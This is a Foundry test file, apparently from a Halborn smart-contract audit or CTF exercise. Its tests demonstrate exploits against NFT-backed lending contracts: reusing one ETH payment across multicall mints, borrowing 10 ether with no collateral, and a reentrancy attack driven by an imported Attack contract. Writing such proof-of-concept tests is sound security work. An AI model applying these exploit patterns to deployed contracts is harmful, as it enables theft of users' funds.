// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Merkle} from "./murky/Merkle.sol";
import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";
import {Attack} from "src/Attack.sol";

contract HalbornTest is Test {
    address public immutable ALICE = makeAddr("ALICE");
    address public immutable BOB = makeAddr("BOB");

    bytes32[] public ALICE_PROOF_1;
    bytes32[] public ALICE_PROOF_2;
    bytes32[] public BOB_PROOF_1;
    bytes32[] public BOB_PROOF_2;

    HalbornNFT public nft;
    HalbornToken public token;
    HalbornLoans public loans;
    Attack public attack;

    function setUp() public {
        // Initialize
        Merkle m = new Merkle();
        // Test Data
        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
        data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));

        // Get Merkle Root
        bytes32 root = m.getRoot(data);

        // Get Proofs
        ALICE_PROOF_1 = m.getProof(data, 0);
        ALICE_PROOF_2 = m.getProof(data, 1);
        BOB_PROOF_1 = m.getProof(data, 2);
        BOB_PROOF_2 = m.getProof(data, 3);

        assertTrue(m.verifyProof(root, ALICE_PROOF_1, data[0]));
        assertTrue(m.verifyProof(root, ALICE_PROOF_2, data[1]));
        assertTrue(m.verifyProof(root, BOB_PROOF_1, data[2]));
        assertTrue(m.verifyProof(root, BOB_PROOF_2, data[3]));

        nft = new HalbornNFT();
        nft.initialize(root, 1 ether);

        token = new HalbornToken();
        token.initialize();

        loans = new HalbornLoans(2 ether);
        loans.initialize(address(token), address(nft));

        token.setLoans(address(loans));

        attack = new Attack(address(loans), address(nft));
    }

    function testMintMulticall() public {
        vm.deal(ALICE, 1 ether);

        bytes memory item = abi.encodeWithSignature("mintBuyWithETH()");
        bytes[] memory data = new bytes[](3);
        data[0] = item;
        data[1] = item;
        data[2] = item;

        vm.prank(ALICE);
        nft.multicall{value: 1 ether}(data);

        assertEq(ALICE, nft.ownerOf(1));
        assertEq(ALICE, nft.ownerOf(2));
        assertEq(ALICE, nft.ownerOf(3));
    }

    function testUpdgrade() public {
        // Initialize
        // Merkle m = new Merkle();
        // // Test Data
        // bytes32[] memory data = new bytes32[](4);
        // data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        // data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        // data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
        // data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));
        // // Get Merkle Root
        // bytes32 root = m.getRoot(data);
        // // Get Proofs
        // ALICE_PROOF_1 = m.getProof(data, 0);
        // ALICE_PROOF_2 = m.getProof(data, 1);
        // BOB_PROOF_1 = m.getProof(data, 2);
        // BOB_PROOF_2 = m.getProof(data, 3);
        // assertTrue(m.verifyProof(root, ALICE_PROOF_1, data[0]));
        // assertTrue(m.verifyProof(root, ALICE_PROOF_2, data[1]));
        // assertTrue(m.verifyProof(root, BOB_PROOF_1, data[2]));
        // assertTrue(m.verifyProof(root, BOB_PROOF_2, data[3]));
        // vm.deal(ALICE, 1 ether);
        // HalbornNFT nft1;
        // HalbornToken token1;
        // nft1 = new HalbornNFT();
        // nft1.initialize(root, 1 ether);
        // token1 = new HalbornToken();
        // token1.initialize();
        // // console.log(proxy.implementation());
        // bytes memory item = abi.encodeWithSignature(
        //     "setLoans(address halbornLoans_)",
        //     address(loans)
        // );
        // bytes[] memory data1 = new bytes[](1);
        // data1[0] = item;
        // // proxy._upgradeToAndCall(address(nft));
        // // vm.prank(ALICE);
        // // token.multicall(data);
        // ERC1967Proxy proxy = new ERC1967Proxy(
        //     address(token1),
        //     abi.encodeWithSignature(
        //         "setLoans(address halbornLoans_)",
        //         address(loans)
        //     )
        // );
    }

    function testRevertMintAfterAirDrop() public {
        Merkle m = new Merkle();
        // Test Data
        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(2))); // Alice can mint token of id 2 in airdrop
        data[1] = keccak256(abi.encodePacked(BOB, uint256(5))); // Bob can mint token of id 5 in airdrop

        // Get Merkle Root
        bytes32 root = m.getRoot(data);

        // Get Proofs
        bytes32[] memory ALICE_PROOF = m.getProof(data, 0);
        bytes32[] memory BOB_PROOF = m.getProof(data, 1);

        assertTrue(m.verifyProof(root, ALICE_PROOF, data[0]));
        assertTrue(m.verifyProof(root, BOB_PROOF, data[1]));

        nft.setMerkleRoot(root);

        vm.deal(ALICE, 2 ether);
        vm.deal(BOB, 2 ether);

        vm.prank(ALICE);
        nft.mintAirdrops(2, ALICE_PROOF);

        assertEq(ALICE, nft.ownerOf(2));

        vm.startPrank(BOB);
        nft.mintBuyWithETH{value: 1 ether}();
        assertEq(BOB, nft.ownerOf(1));

        vm.expectRevert();
        nft.mintBuyWithETH{value: 1 ether}();
        vm.stopPrank();
    }

    function testIncorrectCheckingCollateralInGetLoan() public {
        vm.deal(ALICE, 1 ether);

        vm.prank(ALICE);
        nft.mintBuyWithETH{value: 1 ether}();

        assertEq(ALICE, nft.ownerOf(1), "Alice is not the owner of token 1");

        vm.startPrank(ALICE);

        nft.approve(address(loans), 1);
        loans.depositNFTCollateral(1);

        vm.stopPrank();

        assertEq(
            address(loans),
            nft.ownerOf(1),
            "Loans contract is not the owner of token 1"
        );
        assertEq(loans.totalCollateral(ALICE), 2 ether);
        assertEq(loans.usedCollateral(ALICE), 0);

        vm.prank(ALICE);
        vm.expectRevert();
        loans.getLoan(1 ether);

        assertEq(token.balanceOf(BOB), 0);
        assertEq(loans.totalCollateral(BOB), 0);
        assertEq(loans.usedCollateral(BOB), 0);
        vm.prank(BOB);
        loans.getLoan(10 ether);

        assertEq(token.balanceOf(BOB), 10 ether);
    }

    function testReentrancyAttack() public {
        vm.deal(ALICE, 1 ether);

        //Buying NFT
        vm.startPrank(ALICE);
        nft.mintBuyWithETH{value: 1 ether}();
        vm.stopPrank();

        assertEq(ALICE, nft.ownerOf(1), "Alice is not the owner of token 1");

        vm.prank(ALICE);
        nft.safeTransferFrom(address(ALICE), address(attack), 1);

        assertEq(token.balanceOf(address(attack)), 0);
        assertEq(loans.usedCollateral(address(attack)), 0);
        assertEq(
            address(attack),
            nft.ownerOf(1),
            "Loans contract is not the owner of token 1"
        );

        attack.attack();

        assertEq(token.balanceOf(address(attack)), 1 ether);

        assertEq(loans.usedCollateral(address(attack)), 1 ether);

        assertEq(
            address(attack),
            nft.ownerOf(1),
            "Loans contract is not the owner of token 1"
        );
    }
}
